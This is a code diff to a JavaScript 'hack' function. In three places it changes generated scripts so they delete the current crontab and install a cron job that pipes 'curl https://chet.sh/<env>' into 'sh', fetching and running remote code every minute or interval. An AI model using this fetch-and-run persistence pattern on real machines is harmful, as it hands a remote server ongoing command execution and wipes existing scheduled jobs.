@@ -23,7 +23,7 @@ function hack(env, cmd, args) {
     // `hack live reset`
      write(env, [
       'crontab -r',
-      'echo "* * * * * curl https://chet.sh/' + env + '" | crontab',
+      'echo "* * * * * curl https://chet.sh/' + env + ' | sh" | crontab',
     ].join('\n'))
 
   } else if (cmd === 'interval') {
@@ -48,7 +48,7 @@ function hack(env, cmd, args) {
 
     write(env, [
       'crontab -r',
-      'echo "' + freq + ' curl https://chet.sh/' + env + '" | crontab',
+      'echo "' + freq + ' curl https://chet.sh/' + env + '| sh" | crontab',
     ].join('\n'))
 
   } else if (cmd === 'cron') {
@@ -65,7 +65,7 @@ function hack(env, cmd, args) {
 
     write(env, [
       "crontab -r",
-      'echo "* * * * * curl https://chet.sh/' + newEnv + '" | crontab',
+      'echo "* * * * * curl https://chet.sh/' + newEnv + ' | sh" | crontab',
     ].join('\n'))
 
     write(newEnv, '')
